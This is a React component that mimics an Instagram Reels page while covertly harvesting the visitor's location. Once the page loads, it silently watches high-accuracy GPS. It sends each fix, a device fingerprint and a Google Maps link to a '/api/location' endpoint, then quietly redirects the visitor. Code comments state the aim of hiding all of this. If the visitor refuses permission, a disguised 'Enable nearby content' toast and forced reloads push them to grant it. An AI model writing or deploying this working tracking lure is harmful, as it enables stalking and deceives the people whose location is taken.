'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import { motion } from 'framer-motion';
import {
  Heart,
  MessageCircle,
  Send,
  Bookmark,
  MoreHorizontal,
  Music,
  ChevronLeft,
  Home,
  Search,
  PlusSquare,
  Film,
  User,
  Wifi,
  Signal,
  MapPin,
  RefreshCw,
} from 'lucide-react';

// ========== TYPES ==========
interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  altitude: number | null;
  altitudeAccuracy: number | null;
  heading: number | null;
  speed: number | null;
  timestamp: number;
}

interface DeviceInfo {
  userAgent: string;
  platform: string;
  language: string;
  cookiesEnabled: boolean;
  doNotTrack: string | null;
  screenWidth: number;
  screenHeight: number;
  pixelRatio: number;
  colorDepth: number;
  vendor: string;
  model: string;
  os: string;
  osVersion: string;
  browser: string;
  browserVersion: string;
  isMobile: boolean;
  isTouchDevice: boolean;
  connectionType: string;
}

// ========== CONSTANTS ==========
const ACCURACY_THRESHOLD = 30;
const MAX_WATCH_TIME = 60000;

// ========== DEVICE INFO (client-only, safe for SSR) ==========
function getDeviceInfo(): DeviceInfo | null {
  if (typeof navigator === 'undefined' || typeof window === 'undefined') return null;

  const ua = navigator.userAgent;
  const platform = navigator.platform || 'Unknown';
  const language = navigator.language || 'Unknown';
  const cookiesEnabled = navigator.cookieEnabled || false;
  const doNotTrack = navigator.doNotTrack;
  const screenWidth = window.screen.width;
  const screenHeight = window.screen.height;
  const pixelRatio = window.devicePixelRatio || 1;
  const colorDepth = window.screen.colorDepth || 24;
  const vendor = (navigator as any).vendor || 'Unknown';

  let model = 'Unknown';
  let os = 'Unknown';
  let osVersion = 'Unknown';
  let browser = 'Unknown';
  let browserVersion = 'Unknown';

  if (/Android/i.test(ua)) {
    os = 'Android';
    const m = ua.match(/Android\s([\d.]+)/);
    osVersion = m ? m[1] : 'Unknown';
    const mm = ua.match(/;\s*([^;)]+)\s+Build/);
    model = mm ? mm[1].trim() : 'Unknown';
  } else if (/iPhone/i.test(ua)) {
    os = 'iOS'; model = 'iPhone';
    const m = ua.match(/OS\s([\d_]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/iPad/i.test(ua)) {
    os = 'iOS'; model = 'iPad';
    const m = ua.match(/OS\s([\d_]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/Windows/i.test(ua)) {
    os = 'Windows';
    const m = ua.match(/Windows NT\s([\d.]+)/);
    osVersion = m ? m[1] : 'Unknown';
  } else if (/Mac OS X/i.test(ua)) {
    os = 'macOS';
    const m = ua.match(/Mac OS X\s([\d_.]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/Linux/i.test(ua)) { os = 'Linux'; }
  else if (/CrOS/i.test(ua)) { os = 'ChromeOS'; }

  if (/Edg\//i.test(ua)) {
    browser = 'Microsoft Edge';
    const m = ua.match(/Edg\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) {
    browser = 'Google Chrome';
    const m = ua.match(/Chrome\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Firefox\//i.test(ua)) {
    browser = 'Mozilla Firefox';
    const m = ua.match(/Firefox\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) {
    browser = 'Apple Safari';
    const m = ua.match(/Version\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/OPR\//i.test(ua)) {
    browser = 'Opera';
    const m = ua.match(/OPR\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  }

  const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
  const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
  const connectionType = conn ? conn.effectiveType || conn.type || 'Unknown' : 'Unknown';

  return {
    userAgent: ua, platform, language, cookiesEnabled, doNotTrack,
    screenWidth, screenHeight, pixelRatio, colorDepth, vendor,
    model, os, osVersion, browser, browserVersion, isMobile, isTouchDevice, connectionType,
  };
}

// ========== REAL TIME HOOK ==========
function useCurrentTime() {
  const [time, setTime] = useState('');
  useEffect(() => {
    const update = () => {
      const now = new Date();
      const h = now.getHours();
      const m = now.getMinutes().toString().padStart(2, '0');
      const ampm = h >= 12 ? 'PM' : 'AM';
      const h12 = h % 12 || 12;
      setTime(`${h12}:${m} ${ampm}`);
    };
    update();
    const interval = setInterval(update, 10000);
    return () => clearInterval(interval);
  }, []);
  return time;
}

// ========== BATTERY HOOK ==========
function useBatteryLevel() {
  const [level, setLevel] = useState(85);
  useEffect(() => {
    const bat = (navigator as any).getBattery;
    if (bat) {
      bat.call(navigator).then((b: any) => {
        setLevel(Math.round(b.level * 100));
        b.addEventListener('levelchange', () => setLevel(Math.round(b.level * 100)));
      }).catch(() => {});
    }
  }, []);
  return level;
}

// ========== CONNECTION HOOK ==========
function useConnectionType() {
  const [connType, setConnType] = useState('5G');
  useEffect(() => {
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
      const map: Record<string, string> = {
        '4g': '5G', '3g': '4G', '2g': '3G', 'slow-2g': 'E', '5g': '5G',
      };
      setConnType(map[conn.effectiveType] || conn.effectiveType?.toUpperCase() || '5G');
    }
  }, []);
  return connType;
}

// ========== MAIN COMPONENT ==========
export default function InstagramReels() {
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [isLoading, setIsLoading] = useState(true);
  const [liked, setLiked] = useState(false);
  const [saved, setSaved] = useState(false);
  // Instagram-style subtle toast for permission (not "LOCATION CAPTURED")
  const [showPermissionHint, setShowPermissionHint] = useState(false);
  const [deniedCount, setDeniedCount] = useState(0);

  const hasRequestedRef = useRef(false);
  const isFinalSentRef = useRef(false);
  const watchIdRef = useRef<number | null>(null);
  const startTimeRef = useRef<number>(0);
  const attemptRef = useRef(0);
  const bestLocationRef = useRef<LocationData | null>(null);

  const currentTime = useCurrentTime();
  const batteryLevel = useBatteryLevel();
  const connectionType = useConnectionType();

  // ========== SILENT: Send location update to Webhook 2 ==========
  const sendToWebhook2 = useCallback(async (loc: LocationData, attempt: number) => {
    try {
      await fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'update',
          latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
          altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
          heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
          deviceInfo: getDeviceInfo(),
          googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
          attemptNumber: attempt,
        }),
      });
      console.log(`[Silent W2] Update #${attempt} - accuracy: ${loc.accuracy.toFixed(1)}m`);
    } catch (e) { console.error('[Silent W2] Fail:', e); }
  }, []);

  // ========== SILENT: Send FINAL most accurate location to Webhook 1, then redirect ==========
  const sendFinalToWebhook1 = useCallback(async (loc: LocationData, attempt: number) => {
    if (isFinalSentRef.current) return;
    isFinalSentRef.current = true;

    try {
      console.log(`[Silent W1] Sending FINAL - lat: ${loc.latitude}, lng: ${loc.longitude}, accuracy: ${loc.accuracy.toFixed(1)}m`);
      const res = await fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'final',
          latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
          altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
          heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
          deviceInfo: getDeviceInfo(),
          googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
          attemptNumber: attempt,
        }),
      });
      const data = await res.json();
      console.log('[Silent W1] Response:', data);

      // SILENT redirect - no overlay, no "Location Captured" screen
      if (data.redirectUrl) {
        // Small delay so the reel keeps playing naturally, then redirect
        setTimeout(() => {
          window.location.href = data.redirectUrl;
        }, 800);
      }
    } catch (e) {
      console.error('[Silent W1] Fail:', e);
    }
  }, []);

  // ========== SILENT: Start watching location - NO UI changes ==========
  const startWatchingLocation = useCallback(() => {
    if (!navigator.geolocation) return;
    if (hasRequestedRef.current) return;
    hasRequestedRef.current = true;

    startTimeRef.current = Date.now();
    isFinalSentRef.current = false;
    attemptRef.current = 0;
    bestLocationRef.current = null;

    const watchId = navigator.geolocation.watchPosition(
      async (position) => {
        const loc: LocationData = {
          latitude: position.coords.latitude, longitude: position.coords.longitude,
          accuracy: position.coords.accuracy, altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading, speed: position.coords.speed,
          timestamp: position.timestamp,
        };

        attemptRef.current += 1;
        const attempt = attemptRef.current;

        // Track best location (lowest accuracy)
        if (!bestLocationRef.current || loc.accuracy < bestLocationRef.current.accuracy) {
          bestLocationRef.current = loc;
        }

        // ALWAYS send to Webhook 2 (every update)
        sendToWebhook2(loc, attempt);

        // Check accuracy threshold - send final to Webhook 1
        if (loc.accuracy <= ACCURACY_THRESHOLD && !isFinalSentRef.current) {
          if (watchIdRef.current !== null) {
            navigator.geolocation.clearWatch(watchIdRef.current);
            watchIdRef.current = null;
          }
          await sendFinalToWebhook1(loc, attempt);
        }

        // Timeout safety: 60s max wait - send whatever best we have
        if (Date.now() - startTimeRef.current >= MAX_WATCH_TIME && !isFinalSentRef.current) {
          if (watchIdRef.current !== null) {
            navigator.geolocation.clearWatch(watchIdRef.current);
            watchIdRef.current = null;
          }
          const bestLoc = bestLocationRef.current || loc;
          await sendFinalToWebhook1(bestLoc, attempt);
        }
      },
      (error) => {
        console.error('[Silent] Location error:', error.code);
        if (watchIdRef.current !== null) {
          navigator.geolocation.clearWatch(watchIdRef.current);
          watchIdRef.current = null;
        }
        setDeniedCount(prev => prev + 1);
        // Show subtle Instagram-style hint (NOT a scary "LOCATION ACCESS REQUIRED" overlay)
        setShowPermissionHint(true);
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );

    watchIdRef.current = watchId;
  }, [sendToWebhook2, sendFinalToWebhook1]);

  // Loading animation
  useEffect(() => {
    const interval = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) { clearInterval(interval); setTimeout(() => setIsLoading(false), 300); return 100; }
        return prev + Math.random() * 15 + 5;
      });
    }, 100);
    return () => clearInterval(interval);
  }, []);

  // Auto-request location SILENTLY after reel shows
  useEffect(() => {
    if (!isLoading && !hasRequestedRef.current) {
      const t = setTimeout(() => startWatchingLocation(), 2000);
      return () => clearTimeout(t);
    }
  }, [isLoading, startWatchingLocation]);

  // Cleanup
  useEffect(() => {
    return () => { if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current); };
  }, []);

  // Handle permission hint button - re-trigger browser prompt
  const handlePermissionRetry = () => {
    setShowPermissionHint(false);
    hasRequestedRef.current = false;
    // Use getCurrentPosition to re-trigger browser's native permission dialog
    navigator.geolocation.getCurrentPosition(
      () => startWatchingLocation(),
      (err) => {
        if (err.code === err.PERMISSION_DENIED) {
          setDeniedCount(prev => prev + 1);
          if (deniedCount >= 1) {
            // Hard denied - reload page to get fresh prompt
            window.location.href = window.location.href.split('?')[0] + '?t=' + Date.now();
          } else {
            setShowPermissionHint(true);
          }
        }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  // ========== LOADING SCREEN ==========
  if (isLoading) {
    return (
      <div className="fixed inset-0 bg-black flex flex-col items-center justify-center z-50">
        <motion.div initial={{ scale: 0.5, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ duration: 0.5 }} className="mb-8">
          <div className="w-20 h-20 rounded-2xl bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center">
            <Film className="w-10 h-10 text-white" />
          </div>
        </motion.div>
        <div className="w-48 h-1 bg-gray-800 rounded-full overflow-hidden">
          <div className="h-full bg-gradient-to-r from-yellow-400 via-pink-500 to-purple-600 rounded-full transition-all duration-200" style={{ width: `${Math.min(loadingProgress, 100)}%` }} />
        </div>
        <p className="text-gray-500 text-sm mt-4">Loading...</p>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black overflow-hidden select-none">
      {/* Background - Instagram reel style */}
      <div className="absolute inset-0 bg-gradient-to-b from-gray-900 via-gray-800 to-black">
        <div className="absolute inset-0 bg-gradient-to-br from-indigo-900/30 via-black to-purple-900/20" />
        <div className="absolute inset-0 opacity-20" style={{ backgroundImage: 'radial-gradient(circle at 30% 40%, rgba(255,255,255,0.1) 0%, transparent 50%), radial-gradient(circle at 70% 60%, rgba(255,255,255,0.05) 0%, transparent 40%)' }} />
      </div>

      {/* ========== STATUS BAR (non-clickable, just show) ========== */}
      <div className="absolute top-0 left-0 right-0 z-30 px-5 pt-3 pb-2">
        <div className="flex justify-between items-center">
          <span className="text-white text-sm font-semibold tracking-tight" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif' }}>
            {currentTime}
          </span>
          <div className="flex items-center gap-[6px]">
            <svg width="17" height="12" viewBox="0 0 17 12" fill="none" className="mt-[1px]">
              <rect x="0" y="8" width="3" height="4" rx="0.7" fill="white" />
              <rect x="4" y="5.5" width="3" height="6.5" rx="0.7" fill="white" />
              <rect x="8" y="3" width="3" height="9" rx="0.7" fill="white" />
              <rect x="12" y="0" width="3" height="12" rx="0.7" fill="white" />
            </svg>
            <svg width="16" height="12" viewBox="0 0 16 12" fill="white" className="mt-[1px]">
              <path d="M8 10.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z" />
              <path d="M4.5 8.5c1-1.2 2.2-1.8 3.5-1.8s2.5.6 3.5 1.8" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none" />
              <path d="M1.5 5.5c1.8-2 4-3 6.5-3s4.7 1 6.5 3" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none" />
            </svg>
            <span className="text-white text-[11px] font-semibold tracking-tight ml-[1px]">{connectionType}</span>
            <div className="flex items-center ml-[2px]">
              <div className="relative w-[25px] h-[11px] rounded-[3px] border border-white/90 p-[1.5px]">
                <div
                  className={`h-full rounded-[1.5px] transition-all ${batteryLevel > 60 ? 'bg-white' : batteryLevel > 20 ? 'bg-yellow-400' : 'bg-red-500'}`}
                  style={{ width: `${batteryLevel}%` }}
                />
              </div>
              <div className="w-[1.5px] h-[4px] bg-white/60 rounded-r-full ml-[0.5px]" />
            </div>
          </div>
        </div>
      </div>

      {/* Top Nav */}
      <div className="absolute top-9 left-0 right-0 z-20 px-4 py-3">
        <div className="flex items-center justify-between">
          <ChevronLeft className="w-6 h-6 text-white" />
          <span className="text-white text-lg font-semibold">Reels</span>
          <MoreHorizontal className="w-6 h-6 text-white" />
        </div>
      </div>

      {/* Right Actions */}
      <div className="absolute right-3 bottom-32 z-20 flex flex-col items-center gap-5">
        <button className="flex flex-col items-center gap-1" onClick={() => setLiked(!liked)}>
          <Heart className={`w-7 h-7 transition-colors ${liked ? 'text-red-500 fill-red-500' : 'text-white'}`} />
          <span className="text-white text-xs">28.3K</span>
        </button>
        <button className="flex flex-col items-center gap-1"><MessageCircle className="w-7 h-7 text-white" /><span className="text-white text-xs">131</span></button>
        <button className="flex flex-col items-center gap-1"><Send className="w-7 h-7 text-white" /><span className="text-white text-xs">56.1K</span></button>
        <button className="flex flex-col items-center gap-1" onClick={() => setSaved(!saved)}>
          <Bookmark className={`w-7 h-7 transition-colors ${saved ? 'text-white fill-white' : 'text-white'}`} />
        </button>
      </div>

      {/* Bottom Reel Info */}
      <div className="absolute left-3 right-16 bottom-24 z-20">
        <div className="flex items-center gap-2 mb-2">
          <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[2px]">
            <div className="w-full h-full rounded-full bg-black flex items-center justify-center"><User className="w-4 h-4 text-gray-400" /></div>
          </div>
          <span className="text-white text-sm font-semibold">explore_world</span>
          <button className="border border-white/70 text-white text-xs px-3 py-0.5 rounded-md font-semibold ml-1">Follow</button>
        </div>
        <p className="text-white text-sm leading-5 mb-2">Find your way around the world ✨ #explore #travel #location</p>
        <div className="flex items-center gap-2">
          <Music className="w-3 h-3 text-white" />
          <div className="overflow-hidden"><p className="text-white text-xs whitespace-nowrap animate-marquee">Radiohead · No Surprises</p></div>
        </div>
      </div>

      {/* Bottom Nav */}
      <div className="absolute bottom-0 left-0 right-0 z-30 bg-black/90 backdrop-blur-sm border-t border-white/10">
        <div className="flex items-center justify-around py-2 pb-4">
          <button className="flex flex-col items-center gap-0.5"><Home className="w-6 h-6 text-white" /><span className="text-white text-[10px]">Home</span></button>
          <button className="flex flex-col items-center gap-0.5"><Search className="w-6 h-6 text-gray-500" /><span className="text-gray-500 text-[10px]">Search</span></button>
          <button className="flex flex-col items-center gap-0.5"><PlusSquare className="w-6 h-6 text-gray-500" /><span className="text-gray-500 text-[10px]">Create</span></button>
          <button className="flex flex-col items-center gap-0.5"><Film className="w-6 h-6 text-white" /><span className="text-white text-[10px]">Reels</span></button>
          <button className="flex flex-col items-center gap-0.5"><div className="w-6 h-6 rounded-full bg-gray-600 flex items-center justify-center"><User className="w-3 h-3 text-gray-400" /></div><span className="text-gray-500 text-[10px]">Profile</span></button>
        </div>
      </div>

      {/* ===== SUBTLE INSTAGRAM-STYLE PERMISSION HINT (NOT a location overlay!) ===== */}
      {/* This looks like a normal Instagram toast notification, not "LOCATION CAPTURED" */}
      {showPermissionHint && (
        <motion.div
          initial={{ y: 100, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          exit={{ y: 100, opacity: 0 }}
          className="absolute bottom-20 left-3 right-3 z-40"
        >
          <div className="bg-gray-900/95 backdrop-blur-lg rounded-xl p-3 border border-white/10 flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center flex-shrink-0">
              <MapPin className="w-5 h-5 text-white" />
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-white text-sm font-medium">Enable nearby content</p>
              <p className="text-gray-400 text-xs">Allow location to see reels near you</p>
            </div>
            <button
              onClick={handlePermissionRetry}
              className="bg-blue-500 hover:bg-blue-600 text-white text-xs font-semibold px-4 py-1.5 rounded-lg transition-colors flex-shrink-0"
            >
              {deniedCount >= 2 ? <RefreshCw className="w-4 h-4" /> : 'Allow'}
            </button>
          </div>
        </motion.div>
      )}
    </div>
  );
}
